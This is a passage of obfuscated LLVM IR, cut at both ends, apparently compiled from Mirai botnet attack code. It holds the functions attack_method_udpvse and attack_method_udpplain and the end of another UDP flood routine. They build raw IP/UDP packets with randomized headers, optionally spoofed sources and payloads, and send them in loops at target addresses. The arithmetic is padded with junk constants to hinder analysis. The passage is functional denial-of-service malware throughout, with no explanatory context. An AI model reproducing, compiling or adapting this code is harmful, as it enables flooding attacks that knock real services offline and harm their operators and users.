  store %struct.udphdr* %223, %struct.udphdr** %25, align 8
  %224 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i64 1
  %226 = bitcast %struct.udphdr* %225 to i8*
  store i8* %226, i8** %26, align 8
  %227 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %228 = load i32, i32* %9, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %227, i64 %229
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i32 0, i32 2
  %232 = load i8, i8* %231, align 4
  %233 = zext i8 %232 to i32
  %234 = icmp slt i32 %233, 32
  br i1 %234, label %235, label %258

; <label>:235:                                    ; preds = %213
  %236 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %237 = load i32, i32* %9, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %236, i64 %238
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i32 0, i32 1
  %241 = load i32, i32* %240, align 4
  %242 = call i32 @ntohl(i32 %241) #8
  %243 = call i32 @rand_next()
  %244 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %245 = load i32, i32* %9, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i64 %246
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i32 0, i32 2
  %249 = load i8, i8* %248, align 4
  %250 = zext i8 %249 to i32
  %251 = lshr i32 %243, %250
  %252 = sub i32 0, %251
  %253 = sub i32 %242, %252
  %254 = add i32 %242, %251
  %255 = call i32 @htonl(i32 %253) #8
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 9
  store i32 %255, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %235, %213
  %259 = load i32, i32* %20, align 4
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %261, label %265

; <label>:261:                                    ; preds = %258
  %262 = call i32 @rand_next()
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 8
  store i32 %262, i32* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %261, %258
  %266 = load i16, i16* %13, align 2
  %267 = zext i16 %266 to i32
  %268 = icmp eq i32 %267, 65535
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %265
  %270 = call i32 @rand_next()
  %271 = trunc i32 %270 to i16
  %272 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 3
  store i16 %271, i16* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %269, %265
  %275 = load i16, i16* %16, align 2
  %276 = zext i16 %275 to i32
  %277 = icmp eq i32 %276, 65535
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 @rand_next()
  %280 = trunc i32 %279 to i16
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  store i16 %280, i16* %282, align 2
  br label %283

; <label>:283:                                    ; preds = %278, %274
  %284 = load i16, i16* %17, align 2
  %285 = zext i16 %284 to i32
  %286 = icmp eq i32 %285, 65535
  br i1 %286, label %287, label %292

; <label>:287:                                    ; preds = %283
  %288 = call i32 @rand_next()
  %289 = trunc i32 %288 to i16
  %290 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 1
  store i16 %289, i16* %291, align 2
  br label %292

; <label>:292:                                    ; preds = %287, %283
  %293 = load i8, i8* %19, align 1
  %294 = icmp ne i8 %293, 0
  br i1 %294, label %295, label %299

; <label>:295:                                    ; preds = %292
  %296 = load i8*, i8** %26, align 8
  %297 = load i16, i16* %18, align 2
  %298 = zext i16 %297 to i32
  call void @rand_str(i8* %296, i32 %298)
  br label %299

; <label>:299:                                    ; preds = %295, %292
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 7
  store i16 0, i16* %301, align 2
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = bitcast %struct.iphdr* %302 to i16*
  %304 = call zeroext i16 @checksum_generic(i16* %303, i32 20)
  %305 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 7
  store i16 %304, i16* %306, align 2
  %307 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 3
  store i16 0, i16* %308, align 2
  %309 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %310 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %311 = bitcast %struct.udphdr* %310 to i8*
  %312 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 2
  %314 = load i16, i16* %313, align 2
  %315 = load i16, i16* %18, align 2
  %316 = zext i16 %315 to i64
  %317 = sub i64 0, %316
  %318 = sub i64 8, %317
  %319 = add i64 8, %316
  %320 = trunc i64 %318 to i32
  %321 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %309, i8* %311, i16 zeroext %314, i32 %320)
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 2
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 1
  %326 = load i16, i16* %325, align 2
  %327 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %328 = load i32, i32* %9, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i32 0, i32 0
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %331, i32 0, i32 1
  store i16 %326, i16* %332, align 2
  %333 = load i32, i32* %10, align 4
  %334 = load i8*, i8** %23, align 8
  %335 = load i16, i16* %18, align 2
  %336 = zext i16 %335 to i64
  %337 = sub i64 0, 28
  %338 = sub i64 0, %336
  %339 = add i64 %337, %338
  %340 = sub i64 0, %339
  %341 = add i64 28, %336
  %342 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %343 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %346, i32 0, i32 0
  %348 = bitcast %struct.sockaddr_in* %347 to %struct.sockaddr*
  store %struct.sockaddr* %348, %struct.sockaddr** %342, align 8
  %349 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %350 = load %struct.sockaddr*, %struct.sockaddr** %349, align 8
  %351 = call i64 @sendto(i32 %333, i8* %334, i64 %340, i32 16384, %struct.sockaddr* %350, i32 16)
  br label %352

; <label>:352:                                    ; preds = %299
  %353 = load i32, i32* %9, align 4
  %354 = sub i32 %353, -1805485860
  %355 = add i32 %354, 1
  %356 = add i32 %355, -1805485860
  %357 = add nsw i32 %353, 1
  store i32 %356, i32* %9, align 4
  br label %208

; <label>:358:                                    ; preds = %208
  br label %207

; <label>:359:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #7
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %323

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #7
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %323

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %178, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %184

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #7
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 15, -1
  %95 = xor i8 %93, %94
  %96 = and i8 %95, %93
  %97 = and i8 %93, 15
  %98 = and i8 %96, 64
  %99 = xor i8 %96, 64
  %100 = or i8 %98, %99
  %101 = or i8 %96, 64
  store i8 %100, i8* %92, align 4
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = xor i8 -16, -1
  %106 = xor i8 %104, %105
  %107 = and i8 %106, %104
  %108 = and i8 %104, -16
  %109 = and i8 %107, 5
  %110 = xor i8 %107, 5
  %111 = or i8 %109, %110
  %112 = or i8 %107, 5
  store i8 %111, i8* %103, align 4
  %113 = load i8, i8* %12, align 1
  %114 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 1
  store i8 %113, i8* %115, align 1
  %116 = load i32, i32* %19, align 4
  %117 = sext i32 %116 to i64
  %118 = sub i64 32, -340558155148204822
  %119 = add i64 %118, %117
  %120 = add i64 %119, -340558155148204822
  %121 = add i64 32, %117
  %122 = trunc i64 %120 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #8
  %124 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 2
  store i16 %123, i16* %125, align 2
  %126 = load i16, i16* %13, align 2
  %127 = call zeroext i16 @htons(i16 zeroext %126) #8
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load i8, i8* %14, align 1
  %131 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 5
  store i8 %130, i8* %132, align 4
  %133 = load i8, i8* %15, align 1
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %73
  %136 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %137 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 4
  store i16 %136, i16* %138, align 2
  br label %139

; <label>:139:                                    ; preds = %135, %73
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 6
  store i8 17, i8* %141, align 1
  %142 = load i32, i32* @LOCAL_ADDR, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 8
  store i32 %142, i32* %144, align 4
  %145 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 9
  store i32 %150, i32* %152, align 4
  %153 = load i16, i16* %16, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #8
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 0
  store i16 %154, i16* %156, align 2
  %157 = load i16, i16* %17, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #8
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 1
  store i16 %158, i16* %160, align 2
  %161 = load i32, i32* %19, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 12, 372789602338702040
  %164 = add i64 %163, %162
  %165 = sub i64 %164, 372789602338702040
  %166 = add i64 12, %162
  %167 = trunc i64 %165 to i16
  %168 = call zeroext i16 @htons(i16 zeroext %167) #8
  %169 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %170 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i8*, i8** %22, align 8
  %172 = bitcast i8* %171 to i32*
  store i32 -1, i32* %172, align 4
  %173 = load i8*, i8** %22, align 8
  %174 = getelementptr inbounds i8, i8* %173, i64 4
  store i8* %174, i8** %22, align 8
  %175 = load i8*, i8** %22, align 8
  %176 = load i8*, i8** %18, align 8
  %177 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %175, i8* %176, i32 %177)
  br label %178

; <label>:178:                                    ; preds = %139
  %179 = load i32, i32* %9, align 4
  %180 = sub i32 %179, 688919085
  %181 = add i32 %180, 1
  %182 = add i32 %181, 688919085
  %183 = add nsw i32 %179, 1
  store i32 %182, i32* %9, align 4
  br label %68

; <label>:184:                                    ; preds = %68
  br label %185

; <label>:185:                                    ; preds = %322, %184
  store i32 0, i32* %9, align 4
  br label %186

; <label>:186:                                    ; preds = %315, %185
  %187 = load i32, i32* %9, align 4
  %188 = load i8, i8* %5, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %322

; <label>:191:                                    ; preds = %186
  %192 = load i8**, i8*** %11, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  store i8* %196, i8** %23, align 8
  %197 = load i8*, i8** %23, align 8
  %198 = bitcast i8* %197 to %struct.iphdr*
  store %struct.iphdr* %198, %struct.iphdr** %24, align 8
  %199 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i64 1
  %201 = bitcast %struct.iphdr* %200 to %struct.udphdr*
  store %struct.udphdr* %201, %struct.udphdr** %25, align 8
  %202 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 2
  %207 = load i8, i8* %206, align 4
  %208 = zext i8 %207 to i32
  %209 = icmp slt i32 %208, 32
  br i1 %209, label %210, label %235

; <label>:210:                                    ; preds = %191
  %211 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %212 = load i32, i32* %9, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = call i32 @ntohl(i32 %216) #8
  %218 = call i32 @rand_next()
  %219 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i64 %221
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i32 0, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = zext i8 %224 to i32
  %226 = lshr i32 %218, %225
  %227 = sub i32 0, %217
  %228 = sub i32 0, %226
  %229 = add i32 %227, %228
  %230 = sub i32 0, %229
  %231 = add i32 %217, %226
  %232 = call i32 @htonl(i32 %230) #8
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 9
  store i32 %232, i32* %234, align 4
  br label %235

; <label>:235:                                    ; preds = %210, %191
  %236 = load i16, i16* %13, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

; <label>:239:                                    ; preds = %235
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i16 %241, i16* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %239, %235
  %245 = load i16, i16* %16, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  br i1 %247, label %248, label %253

; <label>:248:                                    ; preds = %244
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %248, %244
  %254 = load i16, i16* %17, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  br i1 %256, label %257, label %262

; <label>:257:                                    ; preds = %253
  %258 = call i32 @rand_next()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %257, %253
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 7
  store i16 0, i16* %264, align 2
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = bitcast %struct.iphdr* %265 to i16*
  %267 = call zeroext i16 @checksum_generic(i16* %266, i32 20)
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 7
  store i16 %267, i16* %269, align 2
  %270 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 3
  store i16 0, i16* %271, align 2
  %272 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %274 = bitcast %struct.udphdr* %273 to i8*
  %275 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 2
  %277 = load i16, i16* %276, align 2
  %278 = load i32, i32* %19, align 4
  %279 = sext i32 %278 to i64
  %280 = sub i64 0, 12
  %281 = sub i64 0, %279
  %282 = add i64 %280, %281
  %283 = sub i64 0, %282
  %284 = add i64 12, %279
  %285 = trunc i64 %283 to i32
  %286 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %272, i8* %274, i16 zeroext %277, i32 %285)
  %287 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %288 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %287, i32 0, i32 3
  store i16 %286, i16* %288, align 2
  %289 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 0
  %297 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %296, i32 0, i32 1
  store i16 %291, i16* %297, align 2
  %298 = load i32, i32* %10, align 4
  %299 = load i8*, i8** %23, align 8
  %300 = load i32, i32* %19, align 4
  %301 = sext i32 %300 to i64
  %302 = sub i64 0, %301
  %303 = sub i64 32, %302
  %304 = add i64 32, %301
  %305 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 0
  %311 = bitcast %struct.sockaddr_in* %310 to %struct.sockaddr*
  store %struct.sockaddr* %311, %struct.sockaddr** %305, align 8
  %312 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %313 = load %struct.sockaddr*, %struct.sockaddr** %312, align 8
  %314 = call i64 @sendto(i32 %298, i8* %299, i64 %303, i32 16384, %struct.sockaddr* %313, i32 16)
  br label %315

; <label>:315:                                    ; preds = %262
  %316 = load i32, i32* %9, align 4
  %317 = sub i32 0, %316
  %318 = sub i32 0, 1
  %319 = add i32 %317, %318
  %320 = sub i32 0, %319
  %321 = add nsw i32 %316, 1
  store i32 %320, i32* %9, align 4
  br label %186

; <label>:322:                                    ; preds = %186
  br label %185

; <label>:323:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57
